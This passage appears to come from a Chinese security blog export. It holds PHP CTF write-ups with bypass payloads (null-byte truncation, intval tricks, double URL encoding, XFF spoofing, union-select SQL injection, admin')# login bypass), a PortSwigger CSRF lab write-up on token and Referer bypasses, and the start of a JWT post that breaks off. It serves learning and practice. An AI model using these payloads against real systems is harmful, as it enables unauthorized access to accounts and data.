= trim($value); //trim — 去除字符串首尾处的空白字符（或者其他字符）\n\n is_string($value) &amp;&amp; $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串\n\n &#125;\n\n&#125;\n\n这里的代码不难，读取到我们所有的 GET 请求与 POST 请求的参数，进行循环，然后把这个参数里面的空格去掉，这就是过滤空白字符了。\n继续往下看 is_palindrome_number() 函数，用来判断是否为回文数。\n后续是判断关键，总结一下有以下四个条件\n1、if(is_numeric($_REQUEST[&#39;number&#39;])) 这个条件需要为假，才能继续往下运行 \n2、要求$req[&#39;number&#39;]&#x3D;&#x3D;strval(intval($req[&#39;number&#39;])) \n3、要求intval($req[&quot;number&quot;])&#x3D;&#x3D;intval(strrev($req[&quot;number&quot;]));&#x2F;&#x2F;strrev函数作用是反转字符串 \n4、 if(is_palindrome_number($req[&quot;number&quot;]))这个条件需要为假，才能输出flag\n\n第一个条件，这里我们不能输入 ?number=1，要不然进不到后续的代码逻辑上，通过 ?number=%001 可以绕过\n针对$req[&#39;number&#39;]==strval(intval($req[&#39;number&#39;]))的话，它这个相当于是不让变量中有字符串，只能有数字时才符合条件，这个是怎么知道的呢，当然是本地测试\n&lt;?php \n\t\nshow_source(__FILE__); \n$a=addslashes(trim($_GET['a'])); \n$b=strval(intval($a)); \nvar_dump($a==$b); \n\n?>\n\n一般的话肯定考虑一个空格给它绕过，但是这段代码里传入的变量都经过了 trim 函数，trim 函数过滤了很多空白字符\n\n\n一般的话当然是没办法了，但是这里还有一个%0c，也就是\\f未被过滤，因此这里我们可以用它来进行绕过，我们本地试也可以发现它是符合条件的\n\n\n现在来看第三个条件 intval($req[&quot;number&quot;])==intval(strrev($req[&quot;number&quot;]));，这个 strrev 函数的作用是反转字符串，这里的话也就是要求数字是回文数，比如 131，这个时候反转一下还是 131，此时就可以满足条件了\n来看最后一个，让 if(is_palindrome_number($req[&quot;number&quot;])) 条件为假，这个函数定义如下\n这个函数当它是回文数时就会正确，因此看似是与条件三矛盾的，但想到还有空白字符，用它的时候同时写回文数，此时是不是就可以成功绕过呢\n我们尝试 payload\n?number=%00%0c131\n\n成功 getflag\n\n\n5. ereg&#x2F;preg_match 正则 %00 截断\n源码如下\n\n&lt;?php \n\n$flag = \"flag\";\n\nif (isset ($_GET['password'])) \n&#123;\n  if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)\n  &#123;\n    echo '&lt;p>You password must be alphanumeric&lt;/p>';\n  &#125;\n  else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] > 9999999)\n   &#123;\n     if (strpos ($_GET['password'], '*-*') !== FALSE) //strpos — 查找字符串首次出现的位置\n      &#123;\n      die('Flag: ' . $flag);\n      &#125;\n      else\n      &#123;\n        echo('&lt;p>*-* have not been found&lt;/p>'); \n       &#125;\n      &#125;\n     else \n     &#123;\n        echo '&lt;p>Invalid password&lt;/p>'; \n      &#125;\n   &#125; \n?>\n\n\n这里的话有三个条件\n1、 if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === TRUE)\n2、(strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] > 9999999)\n3、  if (strpos ($_GET['password'], '*-*') !== FALSE)\n\n第一个，就是匹配里面要有字母与数字，没事；第二个比较要动脑，要求我们的密码值大于 9999999，但是不得超过 8 位，你细品；第三个让password中包含*-*，这与第一点相悖了，思考这个绕过。\n第一个先不考虑，直接看第二个，第二个的绕过很简单，用科学计数法即可。\npayload：\n?password&#x3D;1e10\n\n第三个条件这里，要与第一个相结合的绕过：\n我们知道当语句遇到%00的时候就会认为是休止符，不再往后看，我们如果在password中添加%00，再添加这个字符串，是不是就可以成功绕过呢，我们构造 payload 如下进行尝试\n?password&#x3D;1e10%00*-*\n\n成功绕过\n6. sha()函数比较绕过源代码如下\n&lt;?php\n\n$flag = \"flag\";\n\nif (isset($_GET['name']) and isset($_GET['password'])) \n&#123;\n    if ($_GET['name'] == $_GET['password'])\n        echo '&lt;p>Your password can not be your name!&lt;/p>';\n    else if (sha1($_GET['name']) === sha1($_GET['password']))\n      die('Flag: '.$flag);\n    else\n        echo '&lt;p>Invalid password.&lt;/p>';\n&#125;\nelse\n    echo '&lt;p>Login first!&lt;/p>';\n?>\n\n\n这里的逻辑简单看一下，很简单，看着就好绕过；要求是传入的 username 和 password 不能相同，但是它们经过 sha1() 算法之后的值要相同。\n\nsha1 算法加密的同样是字符串，那就意味着当值为数组时同样会报错，如果我们让两个都报错，那么他们肯定是同种类型的 Null，此时就可以绕过，正常的话我们会构造 payload 如下\nname[]&#x3D;1&amp;password[]&#x3D;2\n\n\n\n7. session 验证绕过源代码如下\n// 08 SESSION验证绕过\n\n&lt;?php\n\n$flag = \"flag\";\n\nsession_start(); \nif (isset ($_GET['password'])) &#123;\n    if ($_GET['password'] == $_SESSION['password'])\n        die ('Flag: '.$flag);\n    else\n        print '&lt;p>Wrong guess.&lt;/p>';\n&#125;\nmt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));\n?>\n\n条件是 $_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;]，这里 session 中的 password 是不存在的，需要我们自己传值，那我们如果不传的话不就为 Null 了吗，此时我们的 GET 传 password 也传个空，此时两者是不是就相等了呢，我们尝试一下\npayload:\n?password&#x3D;\n\n\n\n8. urldecode 二次编码绕过\n原代码如下\n\n&lt;?php\nif(eregi(\"hackerDJ\",$_GET['id'])) &#123;\n  echo(\"&lt;p>not allowed!&lt;/p>\");\n  exit();\n&#125;\n\n$_GET['id'] = urldecode($_GET['id']);\nif($_GET['id'] == \"hackerDJ\")\n&#123;\n  echo \"&lt;p>Access granted!&lt;/p>\";\n  echo \"&lt;p>flag: *****************&#125; &lt;/p>\";\n&#125;\n?>\n\n写的和那啥一样，一塌糊涂，这里我修改了一下\n// 10 urldecode二次编码绕过\n\n&lt;?php\n\n$id = $_GET['id'];\n\nif(preg_match(\"hackerDJ\",$id)) &#123;\n  echo(\"&lt;p>not allowed!&lt;/p>\");\n  $flag=false;\n&#125;\nif ($flag === true) &#123;\n$m = urldecode($id);\nif($m == \"hackerDJ\")\n&#123;\n  echo \"&lt;p>Access granted!&lt;/p>\";\n  echo \"&lt;p>flag: *****************&#125; &lt;/p>\";\n&#125;\n&#125;\n?>\n\n\n这样逻辑是对的\n\n代码逻辑：获取 GET 请求中的 id 参数，判断 id 参数是否与 “hackerDJ” 相同，如果相同，寄。如果不相同，继续往下看，判断 url 编码后 的 id 变量是否与 “hackerDJ” 相同，这个地方需要对 id 的值进行二次编码，因为第一次编码传进去的会经过一次解码，所以会编程 hackDJ；所以我们的 payload 如下\n?id&#x3D;%2568%2561%2563%256b%2544%254a\n\n这道题还是有点二，算了，就当是二次编码的一个学习吧。\n9. X-Forwarded-For 绕过指定 IP 地址这个有点意思，源码如下\n&lt;?php\nfunction GetIP()&#123;\nif(!empty($_SERVER[\"HTTP_CLIENT_IP\"]))\n    $cip = $_SERVER[\"HTTP_CLIENT_IP\"];\nelse if(!empty($_SERVER[\"HTTP_X_FORWARDED_FOR\"]))\n    $cip = $_SERVER[\"HTTP_X_FORWARDED_FOR\"];\nelse if(!empty($_SERVER[\"REMOTE_ADDR\"]))\n    $cip = $_SERVER[\"REMOTE_ADDR\"];\nelse\n    $cip = \"0.0.0.0\";\nreturn $cip;\n&#125;\n\n$GetIPs = GetIP();\nif ($GetIPs==\"1.1.1.1\")&#123;\necho \"Great! flag is ctf&#123;*********&#125;\";\n&#125;\nelse&#123;\necho \"错误！你的IP不在访问列表之内！\";\n&#125;\n?>\n\n做这道题之前不妨先了解一下HTTP_CLIENT_IP、X_FORWARDED_FOR和REMOTE_ADDR\nHTTP_CLIENT_IP 是代理服务器发送的HTTP头\nHTTP_CLIENT_IP 是代理服务器发送的HTTP头，HTTP_CLIENT_IP确实存在于http请求的header里。\n\nX_FORWARDED_FOR\n\n简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP代理或者负载均衡服务器时才会添加该项，正如上面所述,当你使用了代理时,web服务器就不知道你的真实IP了,为了避免这个情况,代理服务器通常会增加一个叫做x_forwarded_for的头信息,把连接它的客户端IP(即你的上网机器IP)加到这个头信息里,这样就能保证网站的web服务器能获取到真实IP\n\nREMOTE_ADDR\n\n表示发出请求的远程主机的 IP地址，remote_addr代表客户端的IP，但它的值不是由客户端提供的，而是服务端根据客户端的ip指定的，当你的浏览器访问某个网站时，假设中间没有任何代理，那么网站的web服务器（Nginx，Apache等）就会把remote_addr设为你的机器IP，如果你用了某个代理，那么你的浏览器会先访问这个代理，然后再由这个代理转发到网站，这样web服务器就会把remote_addr设为这台代理机器的IP\n\n简单的总结一下就是\n$_SERVER[&#39;REMOTE_ADDR&#39;]; &#x2F;&#x2F;访问端（有可能是用户，有可能是代理的）IP\n$_SERVER[&#39;HTTP_CLIENT_IP&#39;]; &#x2F;&#x2F;代理端的（有可能存在，可伪造）\n$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]; &#x2F;&#x2F;用户是在哪个IP使用的代理（有可能存在，也可以伪造）\n\n尝试伪造 XFF 头来进行绕过\n\n\n10. intval 函数\n这里有四块内容，慢慢讲\n\nint intval(var,base) 的特性\n如果 base 是 0，通过检测 var 的格式来决定使用的进制： \n\n如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，  \n如果字符串以 “0” 开始，使用 8 进制(octal)；否则，  \n将使用 10 进制 (decimal)。\n\nintval 四舍五入绕过源代码：\n&lt;?php\n\nif($_GET[id]) &#123;\n   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);\n  mysql_select_db(SAE_MYSQL_DB);\n  $id = intval($_GET[id]);\n  $query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\"));\n  if ($_GET[id]==1024) &#123;\n      echo \"&lt;p>no! try again&lt;/p>\";\n  &#125;\n  else&#123;\n    echo($query[content]);\n  &#125;\n&#125;\n\n?>\n\n绕如其名\n整体看过后，发现重点大致是这几句\n1 、$id = intval($_GET[id]);\n$query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\"));\n2、if($_GET[id]==1024)\n\n第二个语句是$_GET[id]不等于1024时才往下执行，但好端端的为什么要提到这个1024呢，往下运行是输出查询结果，这是不是间接的说明id为1024时对应的内容为flag呢，因此我们这里去构造一个1024即可，但等于1024又无法往下运行，这个时候就关注到了查询语句中是$id，而$id是intval($_GET[id])，因此这里就可以用intval的几个特性来绕过了\n从官方例子中也可以看出，小数点后不计，那我们这里传值1024.2，在查询时不也是1024吗，而且后面检测是否为1024时还可以绕过检测，因此最终payload为\nid&#x3D;1024.2\n\n\n绕 preg_match 正则源代码\n&lt;?php\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n \nif(isset($_GET['num']))&#123;\n    $num = $_GET['num'];\n    if(preg_match(\"/[0-9]/\", $num))&#123;\n        die(\"no no no!\");\n    &#125;\n    if(intval($num))&#123;\n        echo $flag;\n    &#125;\n&#125;\n?>\n\n0 - 9 都被过滤了，所以要用数组来绕过\npayload：\nnum[]&#x3D;1\n\n绕某个具体数字源代码\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num']))&#123;\n    $num = $_GET['num'];\n    if($num===\"4476\")&#123;\n        die(\"no no no!\");\n    &#125;\n    if(intval($num,0)===4476)&#123;\n        echo $flag;\n    &#125;else&#123;\n        echo intval($num,0);\n    &#125;\n&#125;\n\n这关的话就是要求变量值不能为4476，但用过intval函数后为4476，这里的话我们首先需要知道intval的第二个参数为0时的意思是什么\n根据这张图绕过\n\n\n看到这里的话就可以看出payload就有多种构造方法了\nnum&#x3D;4476e123\n&#x2F;&#x2F;这里就跟上面那个单引号的1e10情况一样，此时只看字母前面的\nnum&#x3D;4476.1\n&#x2F;&#x2F;计算int值时，后面有小数点会直接舍去\nnum&#x3D;0x117c\n&#x2F;&#x2F;0x表明是十六进制数，117c是4476的十六进制数\nnum&#x3D;010574\n&#x2F;&#x2F;0表明是八进制数，10574是4476的八进制数\n\npayload:\n?number&#x3D;010574\n\n终极绕过include(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num']))&#123;\n    $num = $_GET['num'];\n    if($num==4476)&#123;\n        die(\"no no no!\");\n    &#125;\n    if(preg_match(\"/[a-z]|\\./i\", $num))&#123;\n        die(\"no no no!!\");\n    &#125;\n    if(!strpos($num, \"0\"))&#123;\n        die(\"no no no!!!\");\n    &#125;\n    if(intval($num,0)===4476)&#123;\n        echo $flag;\n    &#125;\n&#125;\n?>\n\n这道题的话看着几乎是防死了，多过滤了.，这就意味着小数点绕过行不通，此时我们看到这个i修饰符，想到那个m修饰符，此时就想起来有个换行符%0a，它对实际输出没影响，它还可以绕过上面的那些函数，因此我们这里构造如下语句，就实现了绕过，由于小数点不能用，这里就用八进制\nnum&#x3D;%0a010574\n\n\n11. 十六进制与数字比较0x04 结合 SQL1. token 伪造\n源代码\n\n&lt;?php\n    include 'common.php';\n    $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);\n    //把一个或多个数组合并为一个数组\n    class db\n    &#123;\n        public $where;\n        function __wakeup()\n        &#123;\n            if(!empty($this->where))\n            &#123;\n                $this->select($this->where);\n            &#125;\n        &#125;\n        function select($where)\n        &#123;\n            $sql = mysql_query('select * from user where '.$where);\n            //函数执行一条 MySQL 查询。\n            return @mysql_fetch_array($sql);\n            //从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false\n        &#125;\n    &#125;\n\n    if(isset($requset['token']))\n    //测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。\n    &#123;\n        $login = unserialize(gzuncompress(base64_decode($requset['token'])));\n        //gzuncompress:进行字符串压缩\n        //unserialize: 将已序列化的字符串还原回 PHP 的值\n\n        $db = new db();\n        $row = $db->select('user=\\''.mysql_real_escape_string($login['user']).'\\'');\n        //mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。\n\n        if($login['user'] === 'ichunqiu')\n        &#123;\n            echo $flag;\n        &#125;else if($row['pass'] !== $login['pass'])&#123;\n            echo 'unserialize injection!!';\n        &#125;else&#123;\n            echo \"(╯‵□′)╯︵┴─┴ \";\n        &#125;\n    &#125;else&#123;\n        header('Location: index.php?error=1');\n    &#125;\n\n?> \n\n重点的话有以下几处，分别是输出 flag 的地方\nif($login['user'] === 'ichunqiu')\n        &#123;\n            echo $flag;\n&#125;\n\n这就要求 $login[&#39;user&#39;] 为 ichunqiu，其次就是它的加密\nif(isset($requset['token']))\n    //测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。\n    &#123;\n        $login = unserialize(gzuncompress(base64_decode($requset['token'])));\n        //gzuncompress:进行字符串压缩\n        //unserialize: 将已序列化的字符串还原回 PHP 的值\n\n\n感觉这个绕过就非常简单了，修改 Cookie 里面的 token 就好了。\n\n写个简单的 EXP 绕一下\n&lt;?php \n\t\n$a=array(['user']==='ichunqiu');\n$user =base64_encode(gzcompress(serialize($a))); \necho $user; \n\n?>\n\n2. 密码 md5 比较绕过&lt;?php\n\n//配置数据库\nif($_POST[user] &amp;&amp; $_POST[pass]) &#123;\n    $conn = mysql_connect(\"********, \"*****\", \"********\");\n    mysql_select_db(\"phpformysql\") or die(\"Could not select database\");\n    if ($conn->connect_error) &#123;\n        die(\"Connection failed: \" . mysql_error($conn));\n&#125; \n\n//赋值\n\n$user = $_POST[user];\n$pass = md5($_POST[pass]);\n\n//sql语句\n\n// select pw from php where user='' union select 'e10adc3949ba59abbe56e057f20f883e' # \n\n// ?user=' union select 'e10adc3949ba59abbe56e057f20f883e' #&amp;pass=123456\n\n$sql = \"select pw from php where user='$user'\";\n$query = mysql_query($sql);\nif (!$query) &#123;\n    printf(\"Error: %s\\n\", mysql_error($conn));\n    exit();\n&#125;\n$row = mysql_fetch_array($query, MYSQL_ASSOC);\n//echo $row[\"pw\"];\n\n  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;\n\n//如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。\n\n\n    echo \"&lt;p>Logged in! Key:************** &lt;/p>\";\n&#125;\nelse &#123;\n    echo(\"&lt;p>Log in failure!&lt;/p>\");\n\n  &#125;\n&#125;\n?>\n\n\n条件是 if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw])))，而这个 $row[pw] 是从根据SQL语句从数据库中查询出来的，因此前面这个也就是说要在数据库中存在这个 SQL 语句对应的密码，而后面的就是校验了，看你输入的密码与数据库是否匹配，这个时候就想到了 union select 可以自己创一行数据\n本地测试如下图\nmysql&gt; select * from users where username&#x3D;&#39;&#39; union select 1,2,3;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | 2        | 3        |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\nmysql&gt; select * from users ;\n+----+----------+------------+\n| id | username | password   |\n+----+----------+------------+\n|  1 | Dumb     | Dumb       |\n|  2 | Angelina | I-kill-you |\n|  3 | Dummy    | p@ssword   |\n|  4 | secure   | crappy     |\n|  5 | stupid   | stupidity  |\n|  6 | superman | genious    |\n|  7 | batman   | mob!le     |\n|  8 | admin    | admin      |\n|  9 | admin1   | admin1     |\n| 10 | admin2   | admin2     |\n| 11 | admin3   | admin3     |\n| 12 | dhakkan  | dumbo      |\n| 14 | admin4   | admin4     |\n+----+----------+------------+\n13 rows in set (0.00 sec)\n\n\n从两个查询语句中可以看出，这个union select查询的语句明显是不存在在数据表中的，它取决于我们union select后面输入的东西的\nmysql&gt; select * from users where username&#x3D;&#39;&#39; union select 1,2,database();\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | 2        | security |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\n那么如果我们用union select的话，这是不是就意味着password可控呢\nmysql&gt; select * from users where username&#x3D;&#39;&#39; union select 1,2,123456;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | 2        | 123456   |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\n此时查询结果，取出password，那肯定就是123456了，由于密码提交的时候有$pass = md5($_POST[pass]);，所以我们提交123456，到检验时中就变成了e10adc3949ba59abbe56e057f20f883e（md5加密后的123456），那我们这个时候不就无法做到对应了吗，不过我们是不是可以把md5加密后的密码放到SQL语句中呢，这样比对的时候不就一致了吗，因此构造payload如下\nuser&#x3D;&#39; union select 1,2,&#39;e10adc3949ba59abbe56e057f20f883e&#39; # &amp;password&#x3D;123456\n\n\n3. sql闭合绕过简单的警号绕过，源码如下\n&lt;?php\n\n\nif($_POST[user] &amp;&amp; $_POST[pass]) &#123;\n    $conn = mysql_connect(\"*******\", \"****\", \"****\");\n    mysql_select_db(\"****\") or die(\"Could not select database\");\n    if ($conn->connect_error) &#123;\n        die(\"Connection failed: \" . mysql_error($conn));\n&#125; \n$user = $_POST[user];\n$pass = md5($_POST[pass]);\n\n//select user from php where (user='admin')#\n\n//exp:admin')#\n\n$sql = \"select user from php where (user='$user') and (pw='$pass')\";\n$query = mysql_query($sql);\nif (!$query) &#123;\n    printf(\"Error: %s\\n\", mysql_error($conn));\n    exit();\n&#125;\n$row = mysql_fetch_array($query, MYSQL_ASSOC);\n//echo $row[\"pw\"];\n  if($row['user']==\"admin\") &#123;\n    echo \"&lt;p>Logged in! Key: *********** &lt;/p>\";\n  &#125;\n\n  if($row['user'] != \"admin\") &#123;\n    echo(\"&lt;p>You are not admin!&lt;/p>\");\n  &#125;\n&#125;\n\n?>\n\npayload:\nusername&#x3D;admin&#39;)#\n\n","categories":["PHP"],"tags":["PHP"]},{"title":"CSRF攻击","url":"/2021/12/10/PortSwigger-CSRF%E6%94%BB%E5%87%BB/","content":"Port CSRF\n\n0x01 什么是CSRF？CSRF全称(Cross-site request forgery)跨站点请求伪造，诱导用户们执行他们不打算执行的操作。是攻击者通过⼀些技术⼿段欺骗⽤户的浏览器去访问⼀个⾃⼰曾经认证过的⽹站并运⾏⼀些操作（如发邮件，发消息，甚⾄财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的⽹站会认为是真正的⽤户操作⽽去运⾏。\nCSRF攻击攻击原理及过程\n用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；\n在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；\n用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；\n网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；\n浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。\n\n1.1 CSRF和XSS的区别XSS是构造恶意的JavaScript代码，让用户中招。\nCSRF是诱导用户们执行他们不打算执行的操作。\n一般来说，XSS漏洞比CSRF漏洞更严重。CSRF攻击本不是出自用户之手，却经过第三方恶意攻击者的处理，伪装成了受信任用户的“亲历亲为”。\n1.2 CSRF和SSRF的区别SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器\nCSRF是诱导用户们执行他们不打算执行的操作。\n1.3 CSRF的危害\n被他人盗取cookie后登录\n\n蠕虫效应\n\n\netc….\n0x02 CSRF怎么打？CSRF攻击的前提\n足以诱导的操作。应用程序中存在攻击者有理由诱发的操作。这可能是特权操作（如修改其他用户的权限）或对用户特定数据的任何操作（如更改用户自己的密码）。\n基于Cookie的会话处理。执行该操作涉及发出一个或多个HTTP请求，并且应用程序仅依靠会话Cookie来标识发出请求的用户。没有其他机制可用于跟踪会话或验证用户请求。\n没有不可预测的请求参数。执行该操作的请求不包含攻击者无法确定或猜测其值的任何参数。例如，当导致用户更改其密码时，如果攻击者需要知道现有密码的值，则该函数不容易受到攻击。\n\n1.简单的CSRF利用Burpsuite中自带的CSRF poc工具进行攻击\n将修改邮箱的界面进行抓包，执行CSRF\n\n\n0x03 有攻击就有防御：CSRF token的出现CSRF token的出现是用来防护CSRF的，那么CSRF token的原理又是怎么样的呢？\ntoken验证\n在HTTP请求中以參数的形式添加一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，假设请求中没有token或者token内容不对，则觉得可能是CSRF攻击而拒绝该请求。\ntoken须要足够随机。\n敏感的操作应该使用POST。而不是GET，以form表单的形式提交。能够避免token泄露。\n\nCSRF token的包如下图所示\n\n\n同样，token也可以放在HTTP头中，这样的方法也是使用token并进行验证。\n这里并非把token以參数的形式置于HTTP请求之中，而是把它放到HTTP头中自己定义的属性里。通过XMLHttpRequest这个类，能够一次性给全部该类请求加上csrftoken这HTTP头属性。并把token值放入当中。这样攻克了上种方法在请求中添加token的不便。\n同一时候，通过XMLHttpRequest请求的地址不会被记录到浏览器的地址栏，也不用操心token会透过Referer泄露到其它站点中去。\n\n接下来我们讲一讲对于token的绕过方法\n\nA.只存在单一token的绕过方式绕过1.通过改变HTTP请求方式，将post请求修改为get请求对包进行修改，修改csrf(token)的值，收到报错。\n\n\n如果要任意执行CSRF，必须要绕过token，这里我们尝试修改HTTP请求方式，将POST请求修改为GET请求。发现成功，再构造poc\n\n\n对于poc的构造，将method中的”POST”修改为”GET”即可\n\n\n绕过2.将csrf token全部删除可以直接绕过如题，对直接删除token进行尝试，发现可以成功发包\n\n\n接下来如法炮制poc\n绕过3：当有多个账号时，账号与token之间不存在一一对应关系对应多个账号时，因为每一个token只能被使用一次，我们先get到某个账号登录过程中的csrf token。接着登录其他账号，在登录其他账号的时候，证明了token只能被使用一次，如图所示。\n\n这里要用burpsuite抓包之后进行drop，然后记住自己的token。\n\n\n\n接着，我们将第一次get到的token替换进入，发包成功，并构造poc，这里poc中也必须使用新的、未使用过的token。\n\n\nB.对于存在多个csrf token时的绕过\n基本是要寻找Set-cookie的地方作为注入点\n\n绕过4：如果web应用中存在CSRFkey又该如何绕过？在此web应用中，csrfKey用来CSRF保护，csrf用来进行会话(session)处理，\n这种情况下，csrfkey很可能没有严格与session互相绑定，没有严格存在一一对应关系。尝试修改数据包后\n\n\n\n\n上图可见，更改sessioncookie会使账号注销，但更改csrfKeycookie只会导致CSRF token被拒绝。这表明csrfKeycookie可能没有严格绑定到会话。\n\n接着，进行常规的CSRF攻击，不可行，原因是csrfKey的存在，这里我们进行csrfKey注入，也就是绕过csrfKey。\n先查找注入点。\n\n在搜索交互中寻找到了注入点，原本我在搜索框直输入了”1”，在response中出现了一栏：Set-cookie: LastSearchTerm=1，nice，找到注入点了，进行csrfKey的注入，如图。\n\n\n明白注入之后，开始构造poc：\n\n\n绕过5：存在CSRF的“双重提交”防御\n这种“双重提交”的作用：验证在请求参数中的token与cookie中的csrf token是否匹配\n\n如图所示，只要cookie的csrf token与请求参数中的token相等即可\n\n\n接下来，寻找Set-cookie的注入点\n\n\n在构造poc，在poc当中，需要对自动生成的poc进行修改，payload：\n\n\nC.防御方不使用CSRF token进行防御，换用HTTP Referer绕过6：对于常规的HTTP Referer方式的绕过如图，所拦截的数据包：其中并不含有CSRF token，只存在一个Referer。\n\n\n这里我们使用HTML的&lt;meta&gt;标记进行绕过，最常用的payload是：\n&lt;meta name=\"referrer\" content=\"never\">\n\n那么这个CSRF poc的payload就是\n\n\n绕过7：HTTP referer不是当前域名抓包后，很明显看到HTTP referer不是当前的子域，和之前的靶场不一样，我们尝试修改域名，达到和上一个靶场一样的子域，查看是否有效\n\n\n\n\n\n302了，盲猜该网站接受任何Referer标头，只要它包含字符串中某个位置的预期域。\n\n构造poc，在头部构建Referrer-Policy=unsafe-url\n整个payload：\n\n\nD.使用SameSite Cookie防御CSRFSameSite cookie一般与csrf token一起使用，这时候的Set-Cookie值可以是\nSet-Cookie: SessionId&#x3D;sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite&#x3D;Strict;\n\nSet-Cookie: SessionId&#x3D;sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite&#x3D;Lax;\n\nStrict规则：浏览器将不会在源自其他站点的任何请求中包含Cookie\nLax规则：起到部分防御CSRF的作用\n\n绕过方法：将POST请求修改为GET请求，参考绕过1\n\n0x04 CSRF 的防御方法1、将 cookie 设置为 HttpOnlyCRSF攻击很大程度上是利用了浏览器的 cookie，为了防止站内的 XSS 漏洞盗取 cookie,需要在cookie中设置“HttpOnly”属性，这样通过程序（如JavaScript脚本、Applet等）就无法读取到cookie信息，避免了攻击者伪造cookie的情况出现。设置cookie为HttpOnly的代码如下：response.setHeader( “Set-Cookie”, “cookiename&#x3D;cookievalue;HttpOnly”);\n方法2、Token 验证(用的最多)：攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于cookie中，因此攻击者可以在不知道用户验证信息的情况下直接利用用户的cookie来通过安全验证。在请求中放入攻击者所不能伪造的信息，并且该信总不存在于cookie之中。服务器发送给客户端一个token；客户端提交的表单中带着这个token；如果这个token不合法，那么服务器拒绝这个请求。假设请求通过POST方式提交，则可以在相应的表单中增加一个隐藏域：&lt;input type=&quot;hidden&quot; name=&quot;_toicen&quot; value=&quot;tokenvalue&quot;/&gt;token的值通过服务端生成，表单提交后token的值通过POST请求与参数一同带到服务端，每次会话可以使用相同的token，会话过期，则token失效，攻击者因无法获取到token，也就无法伪造请求。在session中添加token的实现代码：\nHttpSession session &#x3D; request.getSession();\nObject token &#x3D; session.getAttribute(&quot;_token&quot;);\nif(token &#x3D;&#x3D; null I I &quot;&quot;.equals(token)) \n\t&#123;    \n\tsession.setAttribute(&quot;_token&quot;, UUID.randomUUIDO .toString());\n\t&#125;\n\n方法3、隐藏令牌：把token隐藏在http的head头中。方法二和方法一有点像，本质上没有太大区别，只是使用方式上有区别。  \n方法4、Referer验证：Referer指的是页面请求来源。意思是，只接受本站的请求，服务器才做响应；如果不是，就拦截。\n","categories":["Port"],"tags":["web安全"]},{"title":"PortSwigger-JWT安全问题","url":"/2022/06/23/PortSwigger-JWT%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/","content":"Port JWT\n\nPortSwigger JWT 安全问题最近看到 PortSwigger 上新出了一个靶场，主题是 JWT 安全。\n0x01 前言JWT 全称 JSON Web Token，是一种标准化格式，用于在系统之间发送加密签名的 JSON 数据。\n原始的 Token 只是一个 uuid，没有任何意义。\nJWT 包含了部分业务信息，减少了 Token 验证等交互操作，效率更高。JWT 作为现如今高度分布式网站的首选 Cookie 之一，今天我们来谈论一下 JWT 的安全性问题。\n0x02 JWT 是什么\n要针对网站的 Cookie 下手，首先我们要知道它是什么。\n\nJWT 由三部分组成，分别为 Header ———— 头部；Payload ———— 负载，Signature ———— 签名。它们之间由三个 . 分隔，由 Base64 加密而来。\nSignature 可用的 JWT 也被称作为 JWS。\n我们以下面这一个 JWT 